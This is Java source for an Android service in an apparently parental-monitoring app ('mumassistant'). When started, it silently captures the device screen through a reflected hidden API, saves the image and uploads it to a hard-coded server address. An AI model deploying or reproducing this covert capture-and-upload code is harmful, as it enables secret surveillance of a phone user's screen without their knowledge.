package com.android.mumassistant.control;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.Map;

import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Matrix;
import android.os.Environment;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.Surface;
import android.view.WindowManager;

public class ShortCutService extends Service{
	private final static String TAG = "ShortCutService";
	private File mFile;
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
	}

	@Override
	@Deprecated
	public void onStart(Intent intent, int startId) {
		// TODO Auto-generated method stub
		super.onStart(intent, startId);
		
		
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		String SDpath = Environment.getExternalStorageDirectory().toString() + File. separator+"Screenshot.png";
		startShot();
		mFile = new File(SDpath);
		if(mFile != null){
			uploadFile(mFile);
		}
		return super.onStartCommand(intent, flags, startId);
		
	}

	public void uploadFile(File imageFile) {
		 try {
	            String requestUrl = "http://192.168.29.69:9090/upload/upload.action";
	            //请求普通信息
	            Map<String, String> params = new HashMap<String, String>();
	            SimpleDateFormat   sDateFormat   =   new   SimpleDateFormat("yyyy-MM-dd   hh:mm:ss");
	            String   date   =   sDateFormat.format(new   java.util.Date()); 
	            params.put("date", date);
	            params.put("fileName", imageFile.getName());
	            //上传文件
	            FormFile formfile = new FormFile(imageFile.getName(), imageFile, "image", "application/octet-stream");
	            SocketHttpRequester.post(requestUrl, params, formfile);
	            Log.i(TAG, "upload success");
	        } catch (Exception e) {
	            Log.i(TAG, "upload error");
	            e.printStackTrace();
	        }
	}
	
	private void startShot(){
		String ShutCutPath = Environment.getExternalStorageDirectory().toString() + File. separator+"Screenshot.png";
		WindowManager mWindowManager = (WindowManager)getSystemService(getApplicationContext().WINDOW_SERVICE);
		Display mDisplay = mWindowManager.getDefaultDisplay();
		Matrix mDisplayMatrix = new Matrix();	
		DisplayMetrics mDisplayMetrics = new DisplayMetrics();
		Bitmap mScreenBitmap = null;
		mDisplay.getRealMetrics(mDisplayMetrics);
		float[] dims = { mDisplayMetrics.widthPixels,
				mDisplayMetrics.heightPixels };
		float degrees = getDegreesForRotation(mDisplay.getRotation());
		boolean requiresRotation = (degrees > 0);
		if (requiresRotation) {
			mDisplayMatrix.reset();
			mDisplayMatrix.preRotate(-degrees);
			mDisplayMatrix.mapPoints(dims);
			dims[0] = Math.abs(dims[0]);
			dims[1] = Math.abs(dims[1]);
		}
		//mScreenBitmap = Surface.screenshot((int) dims[0], (int) dims[1]);
		try {
			Class<?> testClass = Class.forName(Surface.class.getName());
			Method[] methods = testClass.getMethods();
			Method saddMethod1 = testClass.getMethod("screenshot", new Class[]{int.class ,int.class});
			mScreenBitmap = (Bitmap) saddMethod1.invoke(null, new Object[]{(int) dims[0],(int) dims[1]});
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchMethodException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalArgumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvocationTargetException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		 
		//ByteArrayOutputStream baos = new ByteArrayOutputStream();
		//mScreenBitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
		
		try {
			FileOutputStream out = new FileOutputStream(ShutCutPath);
			mScreenBitmap.compress(Bitmap.CompressFormat. PNG, 100, out);
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		//Bitmap Bmp = Bitmap.createBitmap( w, h, Config.ARGB_8888 );
		//return baos.toByteArray();
		return;
	}
	
    private float getDegreesForRotation(int value) {
        switch (value) {
        case Surface.ROTATION_90:
            return 360f - 90f;
        case Surface.ROTATION_180:
            return 360f - 180f;
        case Surface.ROTATION_270:
            return 360f - 270f;
        }
        return 0f;
    }
}
